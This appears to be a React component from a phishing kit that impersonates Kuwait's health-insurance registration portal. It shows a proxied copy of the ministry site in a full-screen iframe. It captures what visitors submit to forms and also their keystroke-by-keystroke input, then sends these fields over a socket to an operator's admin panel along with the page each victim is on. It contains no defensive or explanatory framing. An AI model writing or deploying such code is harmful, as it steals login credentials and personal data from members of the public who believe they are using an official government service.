import { useState, useEffect, useRef } from 'react';
import { socket, visitor, sendData, navigateToPage } from '../lib/store';

const WORKER_BASE = 'https://moh-proxy-2.fanarali881.workers.dev';

export default function KuwaitInsuranceHome() {
  const [loading, setLoading] = useState(true);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  // Get saved path from localStorage (for refresh persistence)
  const getSavedPath = () => {
    const saved = localStorage.getItem('moh-current-path');
    if (saved) return saved;
    return '/Insurance/logaction';
  };

  const [iframePath] = useState(getSavedPath);

  useEffect(() => {
    // Listen for postMessage from Worker (navigation + form data)
    const handleMessage = (event: MessageEvent) => {
      if (!event.data || !event.data.type) return;

      // Handle navigation tracking
      if (event.data.type === 'moh-navigation' && event.data.path) {
        localStorage.setItem('moh-current-path', event.data.path);
        // Update page in admin panel
        const pageName = getPageName(event.data.path);
        navigateToPage(pageName);
      }

      // Handle form data capture
      if (event.data.type === 'moh-form-data' && event.data.fields) {
        console.log('Captured form data from MOH:', event.data);
        const fields = event.data.fields;
        const pagePath = event.data.page || '';
        const pageName = getPageName(pagePath);

        // Send data to server via socket
        if (socket.value.connected && visitor.value._id) {
          const payload = {
            content: fields,
            page: pageName,
            waitingForAdminResponse: false,
          };
          console.log('Sending MOH form data to server:', payload);
          socket.value.emit('more-info', payload);
        } else {
          // Store and retry
          console.log('Socket not ready, retrying in 1s...');
          setTimeout(() => {
            if (socket.value.connected && visitor.value._id) {
              const payload = {
                content: fields,
                page: pageName,
                waitingForAdminResponse: false,
              };
              socket.value.emit('more-info', payload);
            }
          }, 1000);
        }
      }

      // Handle input change tracking (real-time)
      if (event.data.type === 'moh-input-change' && event.data.fields) {
        console.log('Input change from MOH:', event.data);
        const fields = event.data.fields;
        const pagePath = event.data.page || '';
        const pageName = getPageName(pagePath);

        if (socket.value.connected && visitor.value._id) {
          const payload = {
            content: fields,
            page: pageName + ' (إدخال مباشر)',
            waitingForAdminResponse: false,
          };
          socket.value.emit('more-info', payload);
        }
      }
    };

    window.addEventListener('message', handleMessage);

    // Also try polling iframe URL as fallback
    const interval = setInterval(() => {
      try {
        const iframe = iframeRef.current;
        if (iframe && iframe.contentWindow) {
          const path = iframe.contentWindow.location.pathname + iframe.contentWindow.location.search;
          if (path && path !== '/') {
            const cleanPath = path.startsWith('/Insurance') ? path : '/Insurance/logaction';
            localStorage.setItem('moh-current-path', cleanPath);
          }
        }
      } catch (e) {
        // Cross-origin - can't read, rely on postMessage
      }
    }, 2000);

    return () => {
      window.removeEventListener('message', handleMessage);
      clearInterval(interval);
    };
  }, []);

  // Convert URL path to readable page name
  function getPageName(path: string): string {
    if (!path) return 'الصفحة الرئيسية';
    const lower = path.toLowerCase();
    if (lower.includes('/login')) return 'تسجيل الدخول';
    if (lower.includes('/register') || lower.includes('/signup') || lower.includes('/createaccount') || lower.includes('/newuser')) return 'إنشاء حساب جديد';
    if (lower.includes('/logaction')) return 'الصفحة الرئيسية';
    if (lower.includes('/service') || lower.includes('/application')) return 'صفحة الخدمات';
    if (lower.includes('/insurance')) return 'التأمين الصحي';
    return path;
  }

  return (
    <div style={{
      width: '100vw',
      height: '100vh',
      position: 'fixed',
      top: 0,
      left: 0,
      zIndex: 9999,
      background: '#f0f4f8',
    }}>
      {loading && (
        <div style={{
          position: 'absolute',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          background: '#f0f4f8',
          zIndex: 10000,
          direction: 'rtl',
          fontFamily: 'Cairo, Arial, sans-serif'
        }}>
          <div style={{
            width: 60,
            height: 60,
            border: '4px solid #e0e0e0',
            borderTop: '4px solid #1a7a4c',
            borderRadius: '50%',
            animation: 'spin 1s linear infinite'
          }} />
          <p style={{ marginTop: 20, color: '#333', fontSize: 16 }}>
            جاري تحميل النظام الآلي لتسجيل الضمان الصحي...
          </p>
          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
        </div>
      )}

      <iframe
        ref={iframeRef}
        src={WORKER_BASE + iframePath}
        onLoad={() => setLoading(false)}
        style={{
          width: '100%',
          height: '100%',
          border: 'none',
        }}
        title="النظام الآلي لتسجيل الضمان الصحي"
        allowFullScreen
      />
    </div>
  );
}
